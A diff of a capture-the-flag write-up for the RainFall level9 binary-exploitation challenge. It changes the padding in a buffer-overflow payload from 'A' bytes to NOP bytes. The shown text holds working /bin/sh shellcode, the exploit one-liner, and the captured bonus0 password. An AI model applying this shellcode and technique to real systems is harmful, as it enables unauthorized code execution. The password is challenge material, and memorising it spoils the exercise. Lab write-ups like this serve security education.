@@ -131,7 +131,7 @@ Let's craft our payload:
 ```
 address of the shellcode + shellcode + padding + address pointing to the shellcode address
 
-0x0804a008 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A"*(108-4-4-21) + 0x0804a00c
+0x0804a008 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\x90"*(108-4-4-21) + 0x0804a00c
 
 -4 bytes for the address of the shellcode
 -4 bytes for the address pointing to the shellcode address
@@ -142,7 +142,7 @@ As mentioned before, we'll have to jump twice to reach the shellcode. The first 
 
 Let's run our payload:
 ```bash
-level9@RainFall:~$ ./level9 `python -c 'print("\x08\x04\xa0\x10"[::-1] + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A" * 83 + "\x08\x04\xa0\x0c"[::-1])'`
+level9@RainFall:~$ ./level9 `python -c 'print("\x08\x04\xa0\x10"[::-1] + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\x90" * 83 + "\x08\x04\xa0\x0c"[::-1])'`
 $ cat /home/user/bonus0/.pass
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 ```
